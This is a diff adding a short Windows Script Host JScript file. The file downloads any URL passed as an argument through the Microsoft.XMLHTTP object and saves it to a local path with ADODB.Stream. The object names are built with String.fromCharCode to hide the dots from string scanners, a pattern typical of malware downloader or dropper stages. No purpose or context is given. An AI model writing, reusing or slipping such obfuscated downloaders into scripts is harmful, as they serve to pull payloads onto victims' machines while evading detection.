@@ -1,0 +1,14 @@
+var iLocal,iRemote,xPost,sGet;
+iLocal =WScript.Arguments(1); 
+iRemote = WScript.Arguments(0); 
+iLocal=iLocal.toLowerCase();
+iRemote=iRemote.toLowerCase();
+xPost = new ActiveXObject("Microsoft"+String.fromCharCode(0x2e)+"XMLHTTP");
+xPost.Open("GET",iRemote,0);
+xPost.Send();
+sGet = new ActiveXObject("ADODB"+String.fromCharCode(0x2e)+"Stream");
+sGet.Mode = 3;
+sGet.Type = 1; 
+sGet.Open(); 
+sGet.Write(xPost.responseBody);
+sGet.SaveToFile(iLocal,2); 
